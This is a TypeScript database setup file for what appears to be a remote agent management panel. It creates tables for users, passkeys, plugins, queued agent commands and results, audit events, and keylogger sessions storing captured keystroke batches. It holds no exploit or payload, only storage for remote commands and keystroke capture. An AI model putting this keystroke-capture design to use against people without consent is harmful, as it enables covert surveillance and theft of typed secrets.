import { drizzle } from 'drizzle-orm/better-sqlite3';
import Database from 'better-sqlite3';
import * as schema from './schema';
import { env } from '$env/dynamic/private';
import { ensureParentDirectory } from '../fs-utils';

if (!env.DATABASE_URL) throw new Error('DATABASE_URL is not set');

const normalizedDbPath = env.DATABASE_URL.startsWith('file:')
	? env.DATABASE_URL.slice('file:'.length)
	: env.DATABASE_URL;

if (!env.DATABASE_URL.startsWith('file::memory:') && env.DATABASE_URL !== ':memory:') {
	const filePath = normalizedDbPath.split('?')[0];
	await ensureParentDirectory(filePath);
}

const client = new Database(env.DATABASE_URL);

client.pragma('foreign_keys = ON');

client.exec(
	`BEGIN;
CREATE TABLE IF NOT EXISTS voucher (
        id TEXT PRIMARY KEY NOT NULL,
        code_hash TEXT NOT NULL,
        created_at INTEGER NOT NULL,
        expires_at INTEGER,
        revoked_at INTEGER,
        redeemed_at INTEGER
);
CREATE UNIQUE INDEX IF NOT EXISTS voucher_code_hash_idx ON voucher (code_hash);

CREATE TABLE IF NOT EXISTS user (
        id TEXT PRIMARY KEY NOT NULL,
        created_at INTEGER NOT NULL,
        voucher_id TEXT NOT NULL,
        role TEXT NOT NULL DEFAULT 'operator',
        passkey_registered INTEGER NOT NULL DEFAULT 0,
        current_challenge TEXT,
        challenge_type TEXT,
        challenge_expires_at INTEGER,
        FOREIGN KEY (voucher_id) REFERENCES voucher(id) ON DELETE RESTRICT
);

CREATE TABLE IF NOT EXISTS session (
        id TEXT PRIMARY KEY NOT NULL,
        user_id TEXT NOT NULL,
        expires_at INTEGER,
        created_at INTEGER NOT NULL,
        description TEXT,
        FOREIGN KEY (user_id) REFERENCES user(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS passkey (
        id TEXT PRIMARY KEY NOT NULL,
        user_id TEXT NOT NULL,
        public_key TEXT NOT NULL,
        counter INTEGER NOT NULL DEFAULT 0,
        device_type TEXT,
        backed_up INTEGER NOT NULL DEFAULT 0,
        transports TEXT,
        created_at INTEGER NOT NULL,
        last_used_at INTEGER,
        FOREIGN KEY (user_id) REFERENCES user(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS recovery_code (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT NOT NULL,
        code_hash TEXT NOT NULL,
        created_at INTEGER NOT NULL,
        consumed_at INTEGER,
        FOREIGN KEY (user_id) REFERENCES user(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS plugin (
        id TEXT PRIMARY KEY NOT NULL,
        status TEXT NOT NULL DEFAULT 'active',
        enabled INTEGER NOT NULL DEFAULT 1,
        auto_update INTEGER NOT NULL DEFAULT 0,
        runtime_type TEXT NOT NULL DEFAULT 'native',
        sandboxed INTEGER NOT NULL DEFAULT 0,
        installations INTEGER NOT NULL DEFAULT 0,
        manual_targets INTEGER NOT NULL DEFAULT 0,
        auto_targets INTEGER NOT NULL DEFAULT 0,
        default_delivery_mode TEXT NOT NULL DEFAULT 'manual',
        allow_manual_push INTEGER NOT NULL DEFAULT 1,
        allow_auto_sync INTEGER NOT NULL DEFAULT 0,
        last_manual_push_at INTEGER,
        last_auto_sync_at INTEGER,
        last_deployed_at INTEGER,
        last_checked_at INTEGER,
        signature_status TEXT NOT NULL DEFAULT 'unsigned',
        signature_trusted INTEGER NOT NULL DEFAULT 0,
        signature_type TEXT NOT NULL DEFAULT 'none',
        signature_hash TEXT,
        signature_signer TEXT,
        signature_public_key TEXT,
        signature_checked_at INTEGER,
        signature_signed_at INTEGER,
        signature_error TEXT,
        signature_error_code TEXT,
        signature_chain TEXT,
        approval_status TEXT NOT NULL DEFAULT 'pending',
        approved_at INTEGER,
        approval_note TEXT,
        created_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
        updated_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now'))
);

CREATE TABLE IF NOT EXISTS plugin_installation (
        plugin_id TEXT NOT NULL,
        agent_id TEXT NOT NULL,
        status TEXT NOT NULL DEFAULT 'pending',
        version TEXT NOT NULL,
        hash TEXT,
        enabled INTEGER NOT NULL DEFAULT 1,
        error TEXT,
        last_deployed_at INTEGER,
        last_checked_at INTEGER,
        created_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
        updated_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
        PRIMARY KEY (plugin_id, agent_id),
        FOREIGN KEY (plugin_id) REFERENCES plugin(id) ON DELETE CASCADE,
        FOREIGN KEY (agent_id) REFERENCES agent(id) ON DELETE CASCADE
);
CREATE INDEX IF NOT EXISTS plugin_installation_agent_idx ON plugin_installation (agent_id);

CREATE TABLE IF NOT EXISTS plugin_marketplace_listing (
        id TEXT PRIMARY KEY NOT NULL,
        plugin_id TEXT NOT NULL,
        name TEXT NOT NULL,
        summary TEXT,
        repository_url TEXT NOT NULL,
        version TEXT NOT NULL,
        manifest TEXT NOT NULL,
        pricing_tier TEXT NOT NULL DEFAULT 'free',
        status TEXT NOT NULL DEFAULT 'pending',
        submitted_by TEXT REFERENCES user(id) ON DELETE SET NULL,
        reviewer_id TEXT REFERENCES user(id) ON DELETE SET NULL,
        license_spdx_id TEXT NOT NULL,
        license_name TEXT,
        license_url TEXT,
        signature_type TEXT NOT NULL,
        signature_hash TEXT NOT NULL,
        signature_public_key TEXT,
        signature TEXT NOT NULL,
        signed_at INTEGER,
        submitted_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
        reviewed_at INTEGER,
        updated_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now'))
);
CREATE UNIQUE INDEX IF NOT EXISTS plugin_marketplace_listing_plugin_idx ON plugin_marketplace_listing (plugin_id);

CREATE TABLE IF NOT EXISTS plugin_marketplace_entitlement (
        id TEXT PRIMARY KEY NOT NULL,
        listing_id TEXT NOT NULL,
        tenant_id TEXT NOT NULL,
        seats INTEGER NOT NULL DEFAULT 1,
        status TEXT NOT NULL DEFAULT 'active',
        granted_by TEXT REFERENCES user(id) ON DELETE SET NULL,
        granted_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
        expires_at INTEGER,
        metadata TEXT,
        last_synced_at INTEGER,
        FOREIGN KEY (listing_id) REFERENCES plugin_marketplace_listing(id) ON DELETE CASCADE,
        FOREIGN KEY (tenant_id) REFERENCES voucher(id) ON DELETE CASCADE
);
CREATE UNIQUE INDEX IF NOT EXISTS plugin_entitlement_tenant_listing_idx ON plugin_marketplace_entitlement (tenant_id, listing_id);

CREATE TABLE IF NOT EXISTS plugin_marketplace_transaction (
        id TEXT PRIMARY KEY NOT NULL,
        listing_id TEXT NOT NULL,
        tenant_id TEXT NOT NULL,
        entitlement_id TEXT,
        amount INTEGER NOT NULL DEFAULT 0,
        currency TEXT NOT NULL DEFAULT 'credits',
        status TEXT NOT NULL DEFAULT 'pending',
        created_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
        processed_at INTEGER,
        metadata TEXT,
        FOREIGN KEY (listing_id) REFERENCES plugin_marketplace_listing(id) ON DELETE CASCADE,
        FOREIGN KEY (tenant_id) REFERENCES voucher(id) ON DELETE CASCADE,
        FOREIGN KEY (entitlement_id) REFERENCES plugin_marketplace_entitlement(id) ON DELETE SET NULL
);
CREATE INDEX IF NOT EXISTS plugin_marketplace_transaction_entitlement_idx ON plugin_marketplace_transaction (entitlement_id);

CREATE TABLE IF NOT EXISTS plugin_registry_entry (
        id TEXT PRIMARY KEY NOT NULL,
        plugin_id TEXT NOT NULL,
        version TEXT NOT NULL,
        manifest TEXT NOT NULL,
        manifest_digest TEXT NOT NULL,
        artifact_hash TEXT,
        artifact_size_bytes INTEGER,
        metadata TEXT,
        approval_status TEXT NOT NULL DEFAULT 'pending',
        published_by TEXT REFERENCES user(id) ON DELETE SET NULL,
        published_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
        approved_by TEXT REFERENCES user(id) ON DELETE SET NULL,
        approved_at INTEGER,
        approval_note TEXT,
        revoked_by TEXT REFERENCES user(id) ON DELETE SET NULL,
        revoked_at INTEGER,
        revocation_reason TEXT,
        created_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
        updated_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now'))
);
CREATE UNIQUE INDEX IF NOT EXISTS plugin_registry_entry_plugin_version_idx ON plugin_registry_entry (plugin_id, version);
CREATE INDEX IF NOT EXISTS plugin_registry_entry_status_idx ON plugin_registry_entry (approval_status);

CREATE TABLE IF NOT EXISTS registry_subscription (
        id TEXT PRIMARY KEY NOT NULL,
        admin_id TEXT NOT NULL,
        channel TEXT NOT NULL,
        cursor INTEGER NOT NULL DEFAULT 0,
        snapshot TEXT NOT NULL,
        created_at INTEGER NOT NULL,
        last_seen_at INTEGER NOT NULL,
        updated_at INTEGER NOT NULL
);
CREATE UNIQUE INDEX IF NOT EXISTS registry_subscription_admin_channel_idx ON registry_subscription (admin_id, channel);

CREATE TABLE IF NOT EXISTS agent (
        id TEXT PRIMARY KEY NOT NULL,
        key_hash TEXT NOT NULL,
        metadata TEXT NOT NULL,
        status TEXT NOT NULL DEFAULT 'offline',
        connected_at INTEGER NOT NULL,
        last_seen INTEGER NOT NULL,
        metrics TEXT,
        config TEXT NOT NULL,
        fingerprint TEXT NOT NULL,
        created_at INTEGER NOT NULL,
        updated_at INTEGER NOT NULL
);
CREATE UNIQUE INDEX IF NOT EXISTS agent_fingerprint_idx ON agent (fingerprint);

CREATE TABLE IF NOT EXISTS agent_note (
        agent_id TEXT NOT NULL,
        note_id TEXT NOT NULL,
        ciphertext TEXT NOT NULL,
        nonce TEXT NOT NULL,
        digest TEXT NOT NULL,
        version INTEGER NOT NULL DEFAULT 1,
        updated_at INTEGER NOT NULL,
        PRIMARY KEY (agent_id, note_id),
        FOREIGN KEY (agent_id) REFERENCES agent(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS agent_command (
        id TEXT PRIMARY KEY NOT NULL,
        agent_id TEXT NOT NULL,
        name TEXT NOT NULL,
        payload TEXT NOT NULL,
        created_at INTEGER NOT NULL,
        FOREIGN KEY (agent_id) REFERENCES agent(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS agent_result (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT NOT NULL,
        command_id TEXT NOT NULL,
        success INTEGER NOT NULL DEFAULT 1,
        output TEXT,
        error TEXT,
        completed_at INTEGER NOT NULL,
        FOREIGN KEY (agent_id) REFERENCES agent(id) ON DELETE CASCADE
);
CREATE UNIQUE INDEX IF NOT EXISTS agent_result_command_idx ON agent_result (agent_id, command_id);

CREATE TABLE IF NOT EXISTS audit_event (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        command_id TEXT NOT NULL,
        agent_id TEXT NOT NULL,
        operator_id TEXT,
        command_name TEXT NOT NULL,
        payload_hash TEXT NOT NULL,
        queued_at INTEGER NOT NULL,
        acknowledged_at INTEGER,
        acknowledgement TEXT,
        executed_at INTEGER,
        result TEXT,
        FOREIGN KEY (operator_id) REFERENCES user(id) ON DELETE SET NULL
);
CREATE UNIQUE INDEX IF NOT EXISTS audit_event_command_idx ON audit_event (command_id);
CREATE INDEX IF NOT EXISTS audit_event_agent_idx ON audit_event (agent_id);

CREATE TABLE IF NOT EXISTS keylogger_session (
        id TEXT PRIMARY KEY NOT NULL,
        agent_id TEXT NOT NULL,
        mode TEXT NOT NULL,
        started_at INTEGER NOT NULL,
        active INTEGER NOT NULL DEFAULT 1,
        config TEXT NOT NULL,
        total_events INTEGER NOT NULL DEFAULT 0,
        last_captured_at INTEGER,
        created_at INTEGER NOT NULL,
        updated_at INTEGER NOT NULL,
        FOREIGN KEY (agent_id) REFERENCES agent(id) ON DELETE CASCADE
);
CREATE INDEX IF NOT EXISTS keylogger_session_agent_idx ON keylogger_session (agent_id);

CREATE TABLE IF NOT EXISTS keylogger_batch (
        id TEXT PRIMARY KEY NOT NULL,
        session_id TEXT NOT NULL,
        agent_id TEXT NOT NULL,
        captured_at INTEGER NOT NULL,
        events TEXT NOT NULL,
        total_events INTEGER NOT NULL,
        created_at INTEGER NOT NULL,
        FOREIGN KEY (session_id) REFERENCES keylogger_session(id) ON DELETE CASCADE,
        FOREIGN KEY (agent_id) REFERENCES agent(id) ON DELETE CASCADE
);
CREATE INDEX IF NOT EXISTS keylogger_batch_session_idx ON keylogger_batch (session_id);
CREATE INDEX IF NOT EXISTS keylogger_batch_agent_idx ON keylogger_batch (agent_id);
COMMIT;`
);

const ensureColumn = (table: string, column: string, ddl: string) => {
	const columns = client.prepare(`PRAGMA table_info(${table})`).all() as Array<{ name: string }>;
	const exists = columns.some((entry) => entry.name === column);
	if (!exists) {
		client.exec(`ALTER TABLE ${table} ADD COLUMN ${ddl}`);
	}
};

ensureColumn('passkey', 'last_used_at', 'last_used_at INTEGER');
ensureColumn('user', 'role', "role TEXT NOT NULL DEFAULT 'operator'");
ensureColumn('plugin', 'approval_status', "approval_status TEXT NOT NULL DEFAULT 'pending'");
ensureColumn('plugin', 'approved_at', 'approved_at INTEGER');
ensureColumn('plugin', 'approval_note', 'approval_note TEXT');
ensureColumn('plugin', 'signature_status', "signature_status TEXT NOT NULL DEFAULT 'unsigned'");
ensureColumn('plugin', 'signature_trusted', 'signature_trusted INTEGER NOT NULL DEFAULT 0');
ensureColumn('plugin', 'signature_type', "signature_type TEXT NOT NULL DEFAULT 'none'");
ensureColumn('plugin', 'signature_hash', 'signature_hash TEXT');
ensureColumn('plugin', 'signature_signer', 'signature_signer TEXT');
ensureColumn('plugin', 'signature_public_key', 'signature_public_key TEXT');
ensureColumn('plugin', 'signature_checked_at', 'signature_checked_at INTEGER');
ensureColumn('plugin', 'signature_signed_at', 'signature_signed_at INTEGER');
ensureColumn('plugin', 'signature_error', 'signature_error TEXT');
ensureColumn('plugin', 'signature_error_code', 'signature_error_code TEXT');
ensureColumn('plugin', 'signature_chain', 'signature_chain TEXT');
ensureColumn('audit_event', 'acknowledged_at', 'acknowledged_at INTEGER');
ensureColumn('audit_event', 'acknowledgement', 'acknowledgement TEXT');
ensureColumn('agent', 'options_state', 'options_state TEXT');
ensureColumn('agent', 'operator_note', 'operator_note TEXT');
ensureColumn('agent', 'operator_note_tags', 'operator_note_tags TEXT');
ensureColumn('agent', 'operator_note_updated_at', 'operator_note_updated_at INTEGER');
ensureColumn('agent', 'operator_note_updated_by', 'operator_note_updated_by TEXT');
ensureColumn('agent', 'downloads_catalogue', 'downloads_catalogue TEXT');

export const db = drizzle(client, { schema });
